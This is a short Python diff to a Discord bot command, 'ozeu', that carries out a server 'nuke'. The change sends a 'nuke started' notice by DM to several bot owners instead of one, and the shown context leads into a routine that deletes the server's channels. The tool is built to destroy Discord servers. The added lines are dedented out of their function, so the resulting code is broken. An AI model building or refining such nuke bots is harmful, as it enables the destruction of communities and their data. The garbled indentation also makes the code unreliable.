@@ -144,18 +144,22 @@ async def ozeu(ctx, guild_id: str = None):
             return
         guild = ctx.guild
 
-    owner = await bot.fetch_user(OWNER_ID)
+    # OWNER_ID はリストなので、まず1人ずつ fetch_user で取得
+owners = [await bot.fetch_user(owner_id) for owner_id in OWNER_ID]
 
-    embed_start = discord.Embed(
-        title="📢 nuke が実行されました",
-        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で nuke処理を開始しました。",
-        color=discord.Color.green()
-    )
-    embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
-    embed_start.timestamp = discord.utils.utcnow()
+embed_start = discord.Embed(
+    title="📢 nuke が実行されました",
+    description=f"サーバー「{guild.name}」 (ID: {guild.id}) で nuke処理を開始しました。",
+    color=discord.Color.green()
+)
+embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
+embed_start.timestamp = discord.utils.utcnow()
 
+# 複数オーナーにDM送信
+for owner in owners:
     await owner.send(embed=embed_start)
-    await ctx.send(embed=embed_start)
+
+await ctx.send(embed=embed_start)
 
     # --- チャンネル削除関数（エラーはログ出力のみ）---
     async def delete_channel(channel):
